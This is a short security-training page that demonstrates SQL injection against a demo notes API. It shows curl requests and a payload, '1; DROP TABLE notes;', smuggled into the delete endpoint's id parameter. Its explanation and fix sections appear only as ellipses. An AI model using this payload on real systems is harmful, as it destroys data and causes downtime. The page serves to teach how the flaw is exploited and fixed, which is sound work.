---
bookCollapseSection: false
---

# Anatomy of a Vulnerability

In this section we will create a SQL injection on vulnerable code, so that we
can perform malicious actions on the application. This shows how SQL injection
works, and explains how vulnerabilities in your application can be exploited and cause
harm to your organization.

## Dropping a Table via SQL Injection

In this example, I will show how to drop the table when running a
curl request and injecting malicious commands. I will show how
to exploit the `DELETE` note api call.

First let's go over a standard flow. We can create some notes via the API:

```bash
$ curl -X POST http://{LOAD_BALANCER_IP}/{APPLICATION_PATH}/add -d '{"message": "ZAP"}'

{
  "Success": "Note added!"
}

$ curl -X POST http://{LOAD_BALANCER_IP}/{APPLICATION_PATH}/add -d '{"message": "YEET"}'

{
  "Success": "Note added!"
}
```

Now we can delete it with the DELETE api-call:

```bash
$ curl -X DELETE http://{LOAD_BALANCER_IP}/{APPLICATION_PATH}/delete\?id\=2
```

Now let's see what happens when a hacker üè¥‚Äç‚ò†Ô∏è tries to exploit this api
path and see if they can perform some malicious activity:

```bash
$ curl -X DELETE http://{LOAD_BALANCER_IP}/{APPLICATION_PATH}/delete\?id\=1%3B%20DROP%20TABLE%20notes
```

The above also drops the notes table, causing information loss and downtime to the application. This can
be critical to a business function.

This means that in the UI, a user can simply add the following to drop the table:

```sql
1; DROP TABLE notes;
```

### Examining the Vulnerable Code

...

### Resolution

...